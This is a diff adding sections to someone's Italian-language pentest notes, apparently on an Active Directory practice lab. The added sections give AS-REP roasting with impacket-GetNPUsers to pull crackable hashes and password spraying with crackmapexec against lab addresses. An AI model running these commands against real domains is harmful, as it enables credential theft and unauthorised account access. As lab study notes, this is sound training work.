@@ -36,3 +36,19 @@ crackmapexec smb 192.168.56.10-23 -u 'guest' -p '' --shares
 ```
 ![[Pasted image 20230810165921.png]]
 cioccato
+
+### **ASPREP-roasting**
+Hai trovato la lista degli username, ora spolvera gli appunti
+```bash
+impacket-GetNPUsers 'north.sevenkingdoms.local/' -no-pass -usersfile users.txt -format hashcat -outputfile hash
+```
+![[Pasted image 20230810171242.png]]
+cracca l'hash
+![[Pasted image 20230810171924.png]]
+
+### **Password Spraying**
+==OCCHIO ALLE POLICY DELLE PASSWORD PERCHE POTRESTI LOCKARE LE PASSWORD==
+```bash
+crackmapexec smb 192.168.56.11 -u user.txt -p user.txt --no-bruteforce
+```
+![[Pasted image 20230810172208.png]]
